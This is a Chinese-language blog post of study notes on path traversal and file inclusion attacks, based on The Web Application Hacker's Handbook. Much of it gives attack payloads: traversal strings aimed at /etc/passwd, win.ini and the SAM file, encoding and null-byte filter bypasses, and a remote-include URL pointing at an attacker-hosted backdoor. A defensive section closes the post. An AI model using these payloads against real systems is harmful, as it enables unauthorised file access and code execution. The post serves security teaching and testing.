---
layout:     post
title:      Chapter 10 Attacking Back-End Components(2)-Manipulating File Paths
subtitle:   处理文件路径
date:       2020-03-16
author:     D
header-img: 
catalog: true
mermaid: true
tags: [web hacking]
---

参考:**The Web Application Hackers Handbook** Chapter 10

Web应用程序中常见的许多类型的功能都涉及将用户提供的输入作为文件或目录名称进行处理。 通常，将输入传递到接受文件路径的API，例如在从本地文件系统检索文件时。 该应用程序会在对用户请求的响应内处理API调用的结果。 如果未正确验证用户提供的输入，则此行为可能导致各种安全漏洞，其中最常见的是文件路径遍历错误和文件包含错误。

# 1.路径遍历漏洞(Path Traversal Vulnerabilities)

当应用程序使用用户可控制的数据以不安全的方式访问应用程序服务器或另一个后端文件系统上的文件和目录时，会出现路径遍历漏洞。 通过提交精心设计的输入，攻击者可能能够从正在访问的文件系统上的任何位置读取或写入任意内容。 这通常使攻击者能够从服务器读取敏感信息，或覆盖敏感文件，最终导致服务器上执行任意命令。

考虑以下示例，其中应用程序使用动态页面将静态图像返回给客户端。 请求的图像的名称在查询字符串参数中指定：
```
http://mdsec.net/filestore/8/GetFile.ashx?filename=keira.jpg
```
服务器处理此请求时，将遵循以下步骤：
- 1.从查询字符串中提取`filename`参数的值。
- 2.将此值附加到前缀 `C:\filestore\`.
- 3.用该名称打开文件。
- 4.读取文件的内容并将其返回给客户端。

出现此漏洞的原因是，攻击者可以将路径遍历序列放入文件名中，以从步骤2中指定的目录回溯，因此可以从服务器上应用程序使用的用户上下文有权访问的任何位置访问文件。 路径遍历序列称为"点-点-斜杠"； 典型的攻击如下所示：
```
http://mdsec.net/filestore/8/GetFile.ashx?filename=..\windows\win.ini
```
当应用程序将filename参数的值附加到images目录的名称时，它将获得以下路径：
```
C:\filestore\..\windows\win.ini
```
这两个遍历序列有效地从images目录后退到C：驱动器的根目录，因此前面的路径与此等效：
```
C:\windows\win.ini
```
因此，服务器实际上不是返回图像文件，而是返回默认的Windows配置文件。

**NOTE**
在旧版本的Windows IIS Web服务器中，默认情况下，应用程序将以本地系统特权运行，从而允许访问本地文件系统上的任何可读文件。 在与许多其他Web服务器相同的最新版本中，默认情况下，服务器的进程在特权较低的用户上下文中运行。 因此，在探查路径穿越漏洞时，最好请求一个默认文件，该文件可以由任何类型的用户读取，例如
```
c:\windows\win.ini.
```
在这个简单的示例中，该应用程序未实施任何防御措施来防止路径遍历攻击。 但是，由于这些攻击已被广泛了解了一段时间，因此通常会遇到基于输入验证筛选器实施针对它们的各种防御措施的应用程序。 如您所见，这些过滤器通常设计不当，可以被旁路熟练的攻击者。

## 1.1 查找和利用路径遍历漏洞(Finding and Exploiting Path Traversal Vulnerabilities)

许多功能需要Web应用程序根据用户请求中提供的参数从文件系统读取或写入文件系统。 如果以不安全的方式执行这些操作，则攻击者可能会提交精心设计的输入，从而导致应用程序访问应用程序设计人员不希望其访问的文件。 这种缺陷被称为路径遍历漏洞，可以使攻击者能够读取包括密码和应用程序日志在内的敏感数据，或覆盖配置文件和软件二进制文件等对安全至关重要的项目。 在最严重的情况下，该漏洞可能使攻击者完全破坏应用程序和基础操作系统。

路径遍历漏洞有时很难检测，并且许多Web应用程序实施针对它们的防御措施，这些措施可能容易受到绕过攻击。 我们将描述您需要的所有各种技术，从确定潜在目标到探测易受攻击的行为，规避应用程序的防御措施以及处理自定义编码。

### 1.1.1 定位攻击目标(Locating Targets for Attack)

在应用程序的初始映射期间，您应该已经确定了与路径遍历漏洞相关的任何明显的攻击面区域。 任何明确旨在上传或下载文件的功能均应进行彻底测试。 此功能通常在工作流程应用程序中找到，用户可以在其中共享文档，在博客和拍卖应用程序中使用。用户可以在其中上传图像的信息，以及在信息应用程序中用户可以检索文档的信息，例如电子书，技术手册和公司报告。

除了这种明显的目标功能之外，其他各种行为也可能暗示与文件系统的相关交互。

**HACK STEPS**
- 1.查看在应用程序映射期间收集的信息，以识别以下内容：
	- 请求参数似乎包含文件或目录名称的任何实例，例如`include=main.inc`或`template=/en/sidebar`。
	- 任何实现可能涉及从服务器文件系统（与后端数据库相对）中检索数据的应用程序功能，例如办公室文档或图像的显示。
- 2.在所有测试中，您将针对每种其他类型的漏洞执行测试，以查找错误消息或其他感兴趣的异常事件。 尝试查找将用户提供的数据传递到文件API或作为操作系统命令的参数的实例的任何证据。

**TIP**
如果您对应用程序具有本地访问权限（无论是在白盒测试中还是由于服务器操作系统受到损害），通常都可以直接确定路径遍历测试的目标，因为您可以监控应用程序执行的所有文件系统交互。

**HACK STEPS**<br>
如果您可以本地访问该Web应用程序，请执行以下操作：
- 1.使用合适的工具监视服务器上的所有文件系统活动。 例如，SysInternals的FileMon工具可以在Windows平台上使用，`ltrace/strace`工具可以在Linux上使用，而`truss`命令可以在Sun的Solaris上使用。
- 2.通过在每个提交的参数（包括所有cookie，查询字符串字段和`POST`数据项）中插入一个唯一的字符串（例如`traversaltest`）来测试应用程序的每个页面。 一次仅定位一个参数，并使用第14章中描述的自动化技术来加快该过程。
- 3.在文件系统监视工具中设置过滤器，以识别包含测试字符串的所有文件系统事件。
- 4.如果在使用您的测试字符串作为文件或目录名称或将其合并到文件或目录名称中发现任何事件，请测试每个实例（如下所述），以确定它是否容易受到路径遍历攻击。

## 1.2 检测路径遍历漏洞(Detecting Path Traversal Vulnerabilities)

确定了路径遍历测试的各种潜在目标之后，您需要单独测试每个实例，以确定是否将用户可控制的数据以不安全的方式传递给相关的文件系统操作。

对于正在测试的每个用户提供的参数，确定遍历序列是否被应用程序阻止或它们是否按预期工作。 通常可靠的初始测试是以不涉及退回到起始目录上方的方式提交遍历序列的方法。

**HACK STEPS**
- 1.假设您要定位的参数已附加到应用程序指定的预设目录中，请修改参数的值以插入任意子目录和单个遍历序列。 例如，如果应用程序提交此参数：
```
file=foo/file1.txt
```
尝试提交此值：
```
file=foo/bar/../file1.txt
```
如果两种情况下应用程序的行为相同，则可能容易受到攻击。 您应该直接遍历开始目录，直接尝试访问其他文件。
- 2.如果两种情况下应用程序的行为不同，则可能是阻塞，剥离或清理遍历序列，从而导致无效的文件路径。 您应该检查是否有任何方法可以规避应用程序的验证过滤器（在下一节中介绍）。<br>
即使子目录`bar`不存在，该测试仍然有效的原因是，大多数常见的文件系统在尝试检索文件路径之前会对文件路径进行规范化。 遍历序列会取消发明的目录，因此服务器不会检查它是否存在。

如果您发现没有在起始目录上跳步而提交遍历序列的任何实例都不会影响应用程序行为的情况，那么下一个测试是尝试从起始目录中移出并从服务器文件系统上的其他位置访问文件。

**HACK STEPS**
- 1.如果您要攻击的应用程序功能提供对文件的读取访问权限，请尝试访问所涉及操作系统上的已知世界可读文件。 提交以下值之一作为您控制的filename参数：
```
../../../../../../../../../../../../etc/passwd
../../../../../../../../../../../../windows/win.ini
```
如果幸运的话，您的浏览器将显示您请求的文件的内容，如图10-5所示。

- 2.如果您要攻击的功能提供对文件的写访问权，则可能很难确定性地验证应用程序是否容易受到攻击。 一种经常有效的测试是尝试写入两个文件-一个文件应该对任何用户都可写，而另一个文件即使对于root或Administrator也不能写。 例如，在Windows平台上，您可以尝试以下操作：
```
../../../../../../../../../../../../writetest.txt
../../../../../../../../../../../../windows/system32/config/sam
```
在基于UNIX的平台上，root用户可能无法写入的文件与版本有关，但是尝试用文件覆盖目录始终会失败，因此您可以尝试以下操作：
```
../../../../../../../../../../../../tmp/writetest.txt
../../../../../../../../../../../../tmp
```
对于每对测试，如果应用程序在响应第一个请求和第二个请求时的行为不同（例如，如果第二个返回错误消息，但第一个没有返回错误消息），则该应用程序可能很容易受到攻击。

- 3.验证具有写访问权的遍历缺陷的另一种方法是，尝试在Web服务器的Web根目录中写入一个新文件，然后尝试使用浏览器检索该文件。 但是，如果您不知道Web根目录的位置，或者如果发生文件访问的用户上下文没有在此写入的权限，则此方法可能不起作用。

![figure10-5](/img/web_hacking/twapp/figure10-5.jpg)

**NOTE**
几乎所有的文件系统都可以容忍多余的遍历序列，这些遍历序列似乎试图移到文件系统的根目录之上。 因此，通常建议在探查缺陷时提交大量遍历序列，如此处给出的示例所示。 数据附加到的起始目录可能位于文件系统的深处，因此，使用过多的序列有助于避免误判。<br>
同样，Windows平台允许正斜杠和反斜杠作为目录分隔符，而基于UNIX的平台仅容忍正斜杠。 此外，某些Web应用程序只能过滤一个版本，而不能过滤另一个版本。 即使您确定Web服务器正在运行基于UNIX的操作系统，该应用程序仍可能会调出基于Windows的后端组件。 因此，建议在探查穿越漏洞时尝试同时使用两个版本。

## 1.3 规避遍历攻击的障碍(Circumventing Obstacles to Traversal Attacks)

同样，Windows平台允许正斜杠和反斜杠作为目录分隔符，而基于UNIX的平台仅容忍正斜杠。 此外，某些Web应用程序只能过滤一个版本，而不能过滤另一个版本。 即使您确定Web服务器正在运行基于UNIX的操作系统，该应用程序仍可能会调出基于Windows的后端组件。 因此，建议在探查穿越漏洞时尝试同时使用两个版本。

通常遇到的第一种输入过滤器涉及检查filename参数是否包含任何路径遍历序列。 如果是这样，则过滤器要么拒绝请求，要么尝试清理输入以删除序列。 这种类型的过滤器通常容易遭受各种攻击，这些攻击使用替代编码和其他技巧来击败过滤器。 这些攻击都利用了输入验证机制所面临的规范化问题，如第2章所述。

**HACK STEPS**
- 1.始终尝试使用正斜杠和反斜杠同时遍历路径。 当文件系统可能同时支持两种输入过滤器时，许多输入过滤器只会检查其中一种。
- 2.尝试使用以下编码对遍历序列进行简单的URL编码表示。 确保对输入中的每个斜杠和点进行编码：
	- 点 - `%2e`
	- 正斜杠 - `%2f`
	- 反斜杠 - `%5c`
- 3.尝试使用16位Unicode编码：
	- 点 - `%u002e`
	- 正斜杠 - `%u2215`
	- 反斜杠 - `%u2216`
- 4.尝试双重URL编码：
	- 点 - `%252e`
	- 正斜杠 - `%252f`
	- 反斜杠 - `%255c`
- 5.尝试使用超长的UTF-8 Unicode编码：
	- 点 - `%c0%2e`,`%e0%40%ae`,`%c0ae`等等
	- 正斜杠 - `%c0%af`,`%e0%80%af`,`%c0%2f`等等
	- 反斜杠 - `%c0%5c`,`%c0%80%5c`等等
您可以在Burp Intruder中使用非法的Unicode有效负载类型来生成任意给定字符的大量替代表示，并将其提交到目标参数内的相关位置。 这些表示严格违反Unicode表示的规则，但是仍然被Unicode解码器的许多实现接受，尤其是在Windows平台上。
- 6.如果应用程序试图通过删除遍历序列来清理用户输入并且不递归地应用此过滤器，则可以通过将一个序列放置在另一个序列中来绕过该过滤器。 例如：
```
....//
....\/
..../\
....\\
```
在防御路径遍历攻击中通常遇到的第二种输入过滤器涉及验证用户提供的文件名是否包含应用程序期望的后缀（文件类型）或前缀（起始目录）。 这种类型的防御措施可以与已经描述的过滤器一起使用。

**HACK STEPS**
- 1.某些应用程序检查用户提供的文件名是以特定文件类型还是以一组文件类型结尾，并拒绝尝试访问其他文件。 有时，可以通过在请求的文件名的末尾放置一个URL编码的空字节，然后是应用程序接受的文件类型来破坏此检查。 例如：
```
../../../../../boot.ini%00.jpg
```
这种攻击有时会成功的原因是，在托管执行环境中使用API实现了文件类型检查，在托管执行环境中，字符串允许包含空字符（例如Java中的String.EndsWith（））。 但是，当实际检索文件时，应用程序最终会在字符串以null终止的非托管环境中使用API。 因此，您的文件名将有效地截断为所需的值。

- 2.某些应用程序试图通过将其自己的文件类型后缀附加到用户提供的文件名来控制要访问的文件类型。 在这种情况下，出于相同的原因，上述任何一种攻击都可能有效。
- 3.一些应用程序检查用户提供的文件名是否以开始目录的特定子目录开头，甚至是特定的文件名。 当然，可以轻松地绕过此检查，如下所示：
```
filestore/../../../../../../../etc/passwd
```
- 4.如果上述针对输入过滤器的攻击没有一个单独成功，则该应用程序可能正在实现多种类型的过滤器，因此，您需要同时组合其中几种攻击（针对遍历序列过滤器和文件类型或目录过滤器）。如果可能的话，最好的方法是尝试将问题分解为不同的阶段。 例如，如果请求：
```
diagram1.jpg
```
成功，但要求：
```
foo/../diagram1.jpg
```
失败，尝试所有可能的遍历序列绕过，直到第二个请求的变体成功。 如果这些成功的遍历序列绕过操作无法使您访问`/etc/passwd`，请检查是否实施了任何文件类型过滤并可以通过以下方法绕过：
```
diagram1.jpg%00.jpg
```
完全在应用程序定义的开始目录中工作，尝试探查以了解所有正在实施的过滤器，并查看是否可以使用所述技术单独绕过每个过滤器。
- 5.当然，如果您具有对应用程序的白盒访问权限，那么您的任务就容易得多，因为您可以系统地处理不同类型的输入，并最终验证实际上到达文件系统的文件名（如果有）。

### 1.3.1 应对自定义编码(Coping with Custom Encoding)

作者可能遇到的最疯狂的路径遍历错误涉及针对用户名的自定义编码方案，该方案最终以不安全的方式处理。 它证明了混淆是不能替代安全的。

该应用程序包含一些工作流功能，使用户能够上传和下载文件。 执行上载的请求提供了一个文件名参数，该参数在写入文件时容易受到路径遍历攻击。 成功上传文件后，应用程序将提供
具有URL的用户可以再次下载它。 有两个重要警告：
- 应用程序验证了要写入的文件是否已经存在。 如果是这样，则应用程序拒绝覆盖它。
- 使用专有的混淆方案表示为下载用户文件而生成的URL。 这似乎是Base64编码的定制形式，其中在编码文件名的每个位置采用了不同的字符集。

总之，这些警告为直接利用此漏洞提供了障碍。 首先，尽管可以向服务器文件系统写入任意文件，但无法覆盖任何现有文件。 而且，Web服务器进程的特权较低，这意味着不可能在任何有趣的位置创建新文件。 其次，如果不对定制编码进行逆向工程，就不可能请求一个任意的现有文件（例如/ etc / passwd），这带来了漫长而无吸引力的挑战。

进行了一些实验，发现混淆的URL包含用户提供的原始文件名字符串。 例如：
- `test.txt` became `zM1YTU4NTY2Y`
- `foo/../test.txt` became `E1NzUyMzE0ZjQ0NjMzND`
编码URL长度的差异表明在应用编码之前未执行路径规范化。 这种行为使我们有足够的机会利用此漏洞。 第一步是提交一个具有以下名称的文件：
```
../../../../../.././etc/passwd/../../tmp/foo
```
其规范形式等效于：
```
/tmp/foo
```
因此，它可以由Web服务器编写。 上载该文件会产生一个包含以下混淆文件名的下载URL：
```
FhwUk1rNXFUVEJOZW1kNlRsUk5NazE2V1RKTmFrMHdUbXBWZWs1NldYaE5lb
```
要修改此值以返回文件`/etc/passwd`，我们只需要在正确的位置截断它，即：
```
FhwUk1rNXFUVEJOZW1kNlRsUk5NazE2V1RKTmFrM
```
尝试使用此值下载文件将按预期返回服务器的密码文件。 该服务器为我们提供了足够的资源，使其能够使用其方案对任意文件路径进行编码，而无需破译所使用的混淆算法！

**NOTE**
您可能已经注意到，以我们上传的文件的名义出现了多余的`./`。 必须确保截断的URL以3字节的明文边界结束，并因此以4字节的已编码文本边界结尾，这与Base64编码方案一致。 截断编码URL途中截断编码URL几乎可以肯定会导致在服务器上解码时出错。

## 1.4 利用遍历漏洞(Exploiting Traversal Vulnerabilities)

确定了可以提供对服务器文件系统上任意文件的读写访问的路径遍历漏洞后，利用这些漏洞可以进行哪种攻击？ 在大多数情况下，您将发现对文件系统的读写访问级别与Web服务器进程相同。

**HACK STEPS**<br>
您可以利用读取访问路径遍历漏洞从服务器中检索有趣的文件，这些文件可能包含直接有用的信息，或者可以帮助您优化针对其他漏洞的攻击。 例如：
- 操作系统和应用程序的密码文件
- 服务器和应用程序配置文件，以发现其他漏洞或调整其他攻击
- 包含可能包含数据库凭据的文件
- 应用程序使用的数据源（例如MySQL数据库文件）是XML文件
- 服务器可执行页面的源代码，以执行代码审查以查找错误（例如，`GetImage.aspx?file=GetImage.aspx`）
- 可能包含用户名和会话令牌等的应用程序日志文件
如果您发现一个授予写访问权限的路径遍历漏洞，则您的主要目标应该是利用此漏洞来实现服务器上命令的任意执行。 以下是利用此漏洞的一些方法：
- 在用户的启动文件夹中创建脚本。
- 修改诸如in.ftpd之类的文件，以便在用户下次连接时执行任意命令。
- 将脚本写入具有执行权限的Web目录中，然后从浏览器中调用它们。

## 1.5 防止路径遍历漏洞(Preventing Path Traversal Vulnerabilities)

到目前为止，消除路径遍历漏洞的最有效方法是避免将用户提交的数据传递到任何文件系统API。 在许多情况下，包括原始示例`GetFile.ashx?filename=keira.jpg`，应用程序都不需要这样做。 大多数不受任何访问控制限制的文件都可以简单地放在Web根目录中，并通过直接URL访问。如果这不可能，则应用程序可以维护页面可能提供的图像文件的硬编码列表。 它可以使用其他标识符来指定需要哪个文件，例如索引号。 任何包含无效标识符的请求都可以被拒绝，并且用户没有攻击面可以操纵页面传递的文件的路径。

在某些情况下，与允许文件上载和下载的工作流功能一样，可能希望允许用户按名称指定文件。 开发人员可能会决定，最简单的方法是将用户提供的文件名传递给文件系统API。 在这种情况下，应用程序应采取纵深防御方法，以在路径遍历攻击的方式中放置多个障碍。

以下是一些可以使用的防御措施示例； 理想情况下，应将尽可能多的这些措施一起实施：
- 在对用户提交的文件名执行所有相关的解码和规范化之后，应用程序应检查它是否包含路径遍历序列（使用反斜杠或正斜杠）或空字节。 如果是这样，则应用程序应停止处理该请求。 它不应尝试对恶意文件进行任何清理。
- 应用程序应使用允许文件类型的硬编码列表，并拒绝对不同类型的任何请求（在完成前面的解码和规范化之后）。
- 在对用户提供的文件名执行所有过滤之后，应用程序应使用适当的文件系统API来验证是否存在任何问题，并且使用该文件名访问的文件位于由Windows Server指定的启动目录中。 应用。

在Java中，可以通过使用用户提供的文件名实例化`java.io.File`对象，然后对该对象调用`getCanonicalPath`方法来实现。 如果此方法返回的字符串不是以起始目录的名称开头，则表明用户以某种方式绕过了应用程序的输入过滤器，因此该请求应被拒绝。

在ASP.NET中，这可以通过将用户提供的文件名传递给`System.Io.Path.GetFullPath`方法并以与Java相同的方式检查返回的字符串来实现。

通过使用chrooted环境访问包含要访问的文件的目录，该应用程序可以减轻大多数可利用的路径遍历漏洞的影响。 在这种情况下，将chrooted目录视为文件系统根目录，并且将忽略尝试升至该目录根目录之上的所有冗余遍历序列。 大多数基于UNIX的平台都原生支持Chrooted文件系统。 通过将相关的起始目录安装为新的逻辑驱动器并使用关联的驱动器号访问其内容，可以在Windows平台上（至少与遍历漏洞有关）获得类似的效果。

应用程序应将其针对路径遍历攻击的防御措施与其日志记录和警报机制集成在一起。 每当收到包含路径遍历序列的请求时，这表明用户方面可能存在恶意。 应用程序应将请求记录为尝试的安全漏洞，终止用户的会话，并在适用的情况下暂停用户的帐户并向管理员生成警报。

# 2.文件包含漏洞(File Inclusion Vulnerabilities)

许多脚本语言都支持使用包含文件。 利用此功能，开发人员可以将可重用的代码组件放置到单独的文件中，并在需要时将它们包含在功能特定的代码文件中。 解释包含文件中的代码，就像将其插入到include指令的位置一样。

## 2.1 远程文件包含(Remote File Inclusion)

PHP语言特别容易受到文件包含漏洞的影响，因为它的包含功能可以接受远程文件路径。 这是PHP应用程序中众多漏洞的基础。

考虑一个向不同位置的人们提供不同内容的应用程序。 当用户选择他们的位置时，它通过请求参数传达给服务器，如下所示：
```
https://wahh-app.com/main.php?Country=US
```
应用程序按以下方式处理Country参数：
```
$country = $_GET['Country'];
include( $country . '.php' );
```
这将导致执行环境加载位于Web服务器文件系统上的文件US.php。 该文件的内容被有效地复制到main.php文件中并执行。

攻击者可以以不同的方式利用此行为，其中最严重的方法是将外部URL指定为包含文件的位置。 PHP包含函数接受此作为输入，执行环境检索指定的文件并执行其内容。 因此，攻击者可以构建包含任意复杂内容的恶意脚本，将其托管在他控制的Web服务器上，然后通过易受攻击的应用程序功能调用该脚本以执行该脚本。 例如：
```
https://wahh-app.com/main.php?Country=http://wahh-attacker.com/backdoor
```

## 2.2 本地文件包含(Local File Inclusion)

在某些情况下，将根据用户可控制的数据加载包含文件，但是无法在外部服务器上指定文件的URL。 例如，如果将用户可控制的数据传递给ASP函数Server.Execute，则攻击者可能能够执行任意ASP脚本，只要该脚本与调用该函数的应用程序属于同一应用程序。

在这种情况下，您仍然可以利用应用程序的行为来执行未经授权的操作：
- 服务器上可能存在无法通过常规路由访问的服务器可执行文件。 例如，可以通过应用程序范围的访问控制来阻止对路径`/admin`的任何请求。 如果您可以使敏感功能包含在您有权访问的页面中，则可以访问该功能。
- 服务器上可能有静态资源受到类似保护，以防止直接访问。 如果可以使它们动态地包含在其他应用程序页面中，则执行环境通常会简单地将静态资源的内容复制到其响应中。

## 2.3 查找文件包含漏洞(Finding File Inclusion Vulnerabilities)

文件包含漏洞可能与用户提供的任何数据有关。 它们在指定语言或位置的请求参数中特别常见。 当服务器端文件的名称作为参数显式传递时，它们通常也会出现。

**HACK STEPS**<br>
要测试远程文件包含缺陷，请按照下列步骤操作：
- 1.在每个目标参数中提交您控制的Web服务器上资源的URL，并确定是否从托管目标应用程序的服务器接收到任何请求。
- 2.如果第一次测试失败，请尝试提交包含不存在的IP地址的URL，并确定在服务器尝试连接时是否发生超时。
- 3.如果发现该应用程序容易受到远程文件包含的攻击，请使用有关语言的可用API构建恶意脚本，如针对动态执行攻击所述。

与支持远程文件包含的脚本环境相比，本地文件包含漏洞可能在更广泛的脚本环境中存在。 要测试本地文件包含漏洞，请按照下列步骤操作：
- 1.提交服务器上已知的可执行资源的名称，并确定应用程序的行为是否发生任何更改。
- 2.提交服务器上已知静态资源的名称，并确定其内容是否复制到应用程序的响应中。
- 3.如果该应用程序容易受到本地文件包含的影响，请尝试访问您无法直接通过Web服务器访问的任何敏感功能或资源。
- 4.测试以查看是否可以使用前面描述的遍历技术访问其他目录中的文件。


[Chapter 10 Attacking Back-End Components(1)-Injecting OS Commands(2)](https://dm116.github.io/2020/03/16/attacking-back-end-components_1_2/)<br>
[Chapter 10 Attacking Back-End Components(3)-Injecting into XML Interpreters](https://dm116.github.io/2020/03/16/attacking-back-end-components_3/)<br>
